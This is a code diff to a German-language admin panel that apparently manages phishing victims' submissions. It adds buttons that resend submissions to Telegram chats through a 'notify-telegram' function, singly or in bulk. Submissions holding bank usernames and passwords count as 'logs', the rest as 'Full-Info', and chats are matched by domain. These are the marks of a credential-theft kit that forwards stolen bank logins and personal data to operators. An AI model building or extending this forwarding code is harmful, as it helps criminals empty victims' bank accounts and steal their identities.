@@ -12,7 +12,7 @@ import { Badge } from "@/components/ui/badge";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { Avatar, AvatarFallback } from "@/components/ui/avatar";
 import { toast } from "sonner";
-import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus, Users, Clock, CheckCircle2, AlertCircle } from "lucide-react";
+import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus, Users, Clock, CheckCircle2, AlertCircle, Send } from "lucide-react";
 import { formatBalance, parseBalanceNumber } from "@/lib/format";
 import { useSubmissions, type Note } from "@/hooks/use-submissions";
 import { useQueryClient } from "@tanstack/react-query";
@@ -64,6 +64,38 @@ function LogsContent() {
   const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
   const [txAmount, setTxAmount] = useState("");
   const [txNote, setTxNote] = useState("");
+  const [resendingId, setResendingId] = useState<string | null>(null);
+  const [bulkResending, setBulkResending] = useState(false);
+
+  const isLog = (s: any) => !!(s.bank_username && s.bank_password);
+
+  const resendOne = async (subId: string) => {
+    setResendingId(subId);
+    const { data, error } = await supabase.functions.invoke("notify-telegram", {
+      body: { submission_id: subId, kind: "auto", force: true },
+    });
+    setResendingId(null);
+    if (error || !data?.ok) { toast.error("Fehler beim Senden"); return; }
+    if (data.sent > 0) toast.success(`An ${data.sent} Chat(s) gesendet (${data.kind})`);
+    else toast.warning("Keine passenden Chats gefunden (Domain prüfen)");
+  };
+
+  const bulkResendFullInfos = async () => {
+    const targets = submissions.filter((s) => !isLog(s));
+    if (targets.length === 0) { toast.info("Keine Full-Infos zu senden"); return; }
+    if (!confirm(`${targets.length} Full-Info(s) erneut an Telegram senden?`)) return;
+    setBulkResending(true);
+    let ok = 0, fail = 0, totalSent = 0;
+    for (const s of targets) {
+      const { data, error } = await supabase.functions.invoke("notify-telegram", {
+        body: { submission_id: s.id, kind: "full_info", force: true },
+      });
+      if (error || !data?.ok) fail++;
+      else { ok++; totalSent += data.sent || 0; }
+    }
+    setBulkResending(false);
+    toast.success(`${ok}/${targets.length} verarbeitet, ${totalSent} Nachricht(en) gesendet${fail ? `, ${fail} Fehler` : ""}`);
+  };
 
   const stats = {
     total: submissions.length,
